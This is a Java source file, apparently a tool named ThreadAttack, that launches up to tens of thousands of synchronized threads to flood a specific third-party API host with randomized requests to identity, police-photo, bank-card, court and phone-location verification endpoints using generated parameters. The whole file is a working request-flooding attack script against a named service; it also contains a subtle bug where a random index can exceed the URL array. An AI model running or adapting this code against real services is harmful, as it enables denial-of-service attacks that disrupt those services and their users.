package com.nzm.gongfang;

import com.google.gson.JsonObject;

import com.nzm.gongfang.tools.MakeParams;
import com.nzm.utils.OkHttpUtils;


import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * @author XHL on 2018/1/11
 */
public class ThreadAttack {

    private static final String URL = "http://tianxingshuke.com/api/rest/";

    private static final String POLICE = "police/";

    private static final String unionPay = "unionpay/";

    private static String baseUrl = URL + "common/organization/auth?account=" + MakeParams.getAccount() + "&signature=" + MakeParams.getSignature() + "&name=" + MakeParams.getName() + "&idCard=" + MakeParams.getIdCard() + "&accountNO=" + MakeParams.getIdCard() + "&bankPreMobile=" + MakeParams.getIdCard() + "&dataType=all&phone=" + MakeParams.getIdCard();


    public static void attackByThread(int number) {
        //创建一个线程池
        ExecutorService service = Executors.newCachedThreadPool();
        //指挥官的命令，设置为1，指挥官一下达命令，则cutDown,变为0，战士们执行任务
        final CountDownLatch cdOrder = new CountDownLatch(1);
        //因为有1万个战士，所以初始值为3，每一个战士执行任务完毕则cutDown一次，当三个都执行完毕，变为0，则指挥官停止等待。
        //最高可承受50000，看电脑配置情况而定
        final CountDownLatch cdAnswer = new CountDownLatch(number);
        for (int i = 0; i < number; i++) {
            Runnable runnable = () -> {
                try {
//                    System.out.println("线程" + Thread.currentThread().MakeParams.getName() + "正准备接受命令");
                    cdOrder.await(); //战士们都处于等待命令状态
//                    System.out.println("线程" + Thread.currentThread().MakeParams.getName() + "已接受命令");
                    Thread.sleep((long) (Math.random() * 10000));
                    getSource();
//                    System.out.println("线程" + Thread.currentThread().MakeParams.getName() + "回应命令处理结果");
                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    cdAnswer.countDown(); //任务执行完毕，返回给指挥官，cdAnswer减1。
                }
            };
            service.execute(runnable);//为线程池添加任务
        }
        try {
            Thread.sleep((long) (Math.random() * 10000));
//            System.out.println("线程" + Thread.currentThread().MakeParams.getName() + "即将发布命令");
            cdOrder.countDown(); //发送命令，cdOrder减1，处于等待的战士们停止等待转去执行任务。
//            System.out.println("线程" + Thread.currentThread().MakeParams.getName() + "已发送命令，正在等待结果");
            cdAnswer.await(); //命令发送后指挥官处于等待状态，一旦cdAnswer为0时停止等待继续往下执行
//            System.out.println("线程" + Thread.currentThread().MakeParams.getName() + "已收到所有响应结果");
        } catch (Exception e) {
            e.printStackTrace();
        } finally {

        }
        service.shutdown(); //任务结束，停止线程池的所有线程
    }

    private static void getSource() {
        for (int i = 0; i < 5; i++) {
            String[] urlList = {
                    URL + unionPay + "auth/4element?account=" + MakeParams.getAccount() + "&accessToken=" + MakeParams.getSignature() + "&name=" + MakeParams.getName() + "&idCard=" + MakeParams.getIdCard() + "&accountNO=" + MakeParams.getIdCard() + "&bankPreMobile=" + MakeParams.getIdCard(),
                    URL + unionPay + "auth/3element?account=" + MakeParams.getAccount() + "&accessToken=" + MakeParams.getSignature() + "&name=" + MakeParams.getName() + "&idCard=" + MakeParams.getIdCard() + "&accountNO=" + MakeParams.getIdCard() + "&bankPreMobile=" + MakeParams.getIdCard(),
                    URL + unionPay + "auth/2element?account=" + MakeParams.getAccount() + "&accessToken=" + MakeParams.getSignature() + "&name=" + MakeParams.getName() + "&idCard=" + MakeParams.getIdCard() + "&accountNO=" + MakeParams.getIdCard() + "&bankPreMobile=" + MakeParams.getIdCard(),
                    URL + POLICE + "identity?account=" + MakeParams.getAccount() + "&accessToken=" + MakeParams.getSignature() + "&name=" + MakeParams.getName() + "&idCard=" + MakeParams.getIdCard() + "&accountNO=" + MakeParams.getIdCard() + "&bankPreMobile=" + MakeParams.getIdCard(),
                    URL + POLICE + "identity?account=" + MakeParams.getAccount() + "&accessToken=" + MakeParams.getSignature() + "&name=" + MakeParams.getName() + "&idCard=" + MakeParams.getIdCard() + "&accountNO=" + MakeParams.getIdCard() + "&bankPreMobile=" + MakeParams.getIdCard(),
                    URL + POLICE + "photo?account=" + MakeParams.getAccount() + "&accessToken=" + MakeParams.getSignature() + "&name=" + MakeParams.getName() + "&idCard=" + MakeParams.getIdCard() + "&accountNO=" + MakeParams.getIdCard() + "&bankPreMobile=" + MakeParams.getIdCard(),
                    URL + "riskTip/blackInfo?account=" + MakeParams.getAccount() + "&accessToken=" + MakeParams.getSignature() + "&name=" + MakeParams.getName() + "&idCard=" + MakeParams.getIdCard() + "&accountNO=" + MakeParams.getIdCard() + "&bankPreMobile=" + MakeParams.getIdCard(),
                    URL + "law/highcourt/personal?account=" + MakeParams.getAccount() + "&accessToken=" + MakeParams.getSignature() + "&name=" + MakeParams.getName() + "&idCard=" + MakeParams.getIdCard() + "&accountNO=" + MakeParams.getIdCard() + "&bankPreMobile=" + MakeParams.getIdCard() + "&dataType=all",
                    URL + "operators/mobile/location?account=" + MakeParams.getAccount() + "&accessToken=" + MakeParams.getSignature() + "&name=" + MakeParams.getName() + "&idCard=" + MakeParams.getIdCard() + "&accountNO=" + MakeParams.getIdCard() + "&bankPreMobile=" + MakeParams.getIdCard() + "&dataType=all&phone=" + MakeParams.getIdCard(),
                    URL + unionPay + "depositBank?account=" + MakeParams.getAccount() + "&accessToken=" + MakeParams.getSignature() + "&name=" + MakeParams.getName() + "&idCard=" + MakeParams.getIdCard() + "&accountNO=" + MakeParams.getIdCard() + "&bankPreMobile=" + MakeParams.getIdCard() + "&dataType=all&phone=" + MakeParams.getIdCard(),
                    URL + unionPay + "depositBank?account=" + MakeParams.getAccount() + "&accessToken=" + MakeParams.getSignature() + "&name=" + MakeParams.getName() + "&idCard=" + MakeParams.getIdCard() + "&accountNO=" + MakeParams.getIdCard() + "&bankPreMobile=" + MakeParams.getIdCard() + "&dataType=all&phone=" + MakeParams.getIdCard(),
                    URL + unionPay + "depositBank?account=" + MakeParams.getAccount() + "&accessToken=" + MakeParams.getSignature() + "&name=" + MakeParams.getName() + "&idCard=" + MakeParams.getIdCard() + "&accountNO=" + MakeParams.getIdCard() + "&bankPreMobile=" + MakeParams.getIdCard() + "&dataType=all&phone=" + MakeParams.getIdCard(),
            };
            //第一种方式，先跑这种，服务器没问题，我们在加如一下种
//            System.out.println(urlList[(int) (Math.random() * 12)]);
            OkHttpUtils.get(urlList[(int) (Math.random() * 12)]);
            JsonObject jsonObject = new JsonObject();


            jsonObject.addProperty("account", MakeParams.getAccount());
            jsonObject.addProperty("signature", MakeParams.getSignature());
//            System.out.println(jsonObject.toString());
            OkHttpUtils.post(baseUrl, jsonObject.toString());
//            try {
//                URL url = new URL("http://m.yohtar.com/");
//                URLConnection conn = url.openConnection();
//                BufferedInputStream bis = new BufferedInputStream(
//                        conn.getInputStream());
//                byte[] bytes = new byte[1024];
//                int len;
//                StringBuffer sb = new StringBuffer();
//                if (bis != null) {
//                    if ((len = bis.read()) != -1) {
//                        sb.append(new String(bytes, 0, len));
//                        bis.close();
//                    }
//                }
//            } catch (IOException e) {
//                e.printStackTrace();
//            }
        }
    }
}
